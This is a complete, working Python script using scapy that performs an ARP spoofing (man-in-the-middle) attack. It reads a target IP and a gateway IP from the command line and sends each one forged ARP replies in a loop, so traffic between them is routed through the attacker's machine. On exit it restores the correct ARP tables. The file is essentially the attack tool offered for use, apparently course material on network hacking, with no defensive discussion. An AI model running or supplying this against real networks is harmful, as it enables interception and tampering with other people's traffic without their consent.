#!/usr/bin/env python
import scapy.all as scapy
import time
import optparse


def parsing():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="The target IP address")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="The gateway IP address")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please enter the Target IP using -t option.")
    if not options.gateway_ip:
        parser.error("[-] Please enter the Gateway IP using -g option.")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, count=4, verbose=False)


def anti_Spoof(destination_ip, source_ip, destination_mac, source_mac):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = parsing()
target_ip = options.target_ip
target_mac = get_mac(target_ip)
gateway_ip = options.gateway_ip
gateway_mac = get_mac(gateway_ip)

try:
    count = 0
    while True:
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, gateway_mac)
        count += 2
        print("\r[+] Sent {0} Packets".format(str(count)),end=" ")  # end=" " and \r is to clear all that is written in the line and print over it, the \r means to start from the beggining of the line and the end option allows us to store the print statement in a buffer all in one line and do not have a new line
        time.sleep(2)
except KeyboardInterrupt:
    print("\n\n[+] Quiting and Resetting ARP tables.....")
    anti_Spoof(target_ip, gateway_ip, target_mac, gateway_mac)
    anti_Spoof(gateway_ip, target_ip, gateway_mac, target_mac)
